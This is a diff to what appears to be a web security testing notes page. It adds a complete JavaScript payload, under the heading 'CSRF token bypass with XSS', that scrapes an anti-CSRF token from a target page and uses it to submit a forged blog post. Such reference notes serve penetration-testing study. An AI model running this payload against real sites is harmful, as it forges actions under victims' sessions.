@@ -298,6 +298,32 @@ Useful Resource:
 
 * [Multi Post CSRF](https://www.lanmaster53.com/2013/07/multi-post-csrf/)
 
+Example CSRF token bypass with XSS:
+{% highlight html %}
+var req = new XMLHttpRequest;
+req.open('GET', 'http://comp.org/index.php?page=add-to-your-blog.php', true);
+req.onload = function (e) {
+	if (this.status == 200) {
+	var parser = new DOMParser ();
+	var responseDoc = parser.parseFromString(this.response, "text/html");
+	token = responseDoc.getElementsByName("xsrf_token")[0].value;
+	console.log('response',token);
+	
+	var postBlog = new XMLHttpRequest;
+	var params = 'input=Bloggs2!&xsrf_token=' + token + '&Submit_button=Submit';
+	postBlog.open('POST', 'http://comp.org/index.php?page=add-to-your-blog.php', true);
+	postBlog.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+	postBlog.onreadystatechange = function() {
+		if(postBlog.readyState == 4 && postBlog.status == 200) {
+			console.log('Blog Posted');
+		}
+	}
+	postBlog.send(params)
+	}
+};
+req.send();
+{% endhighlight %}
+
 > **Useful Resources**
 
 * [XSS, SQL, LDAP, XPATH, XML Injection Test Strings](https://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors) 
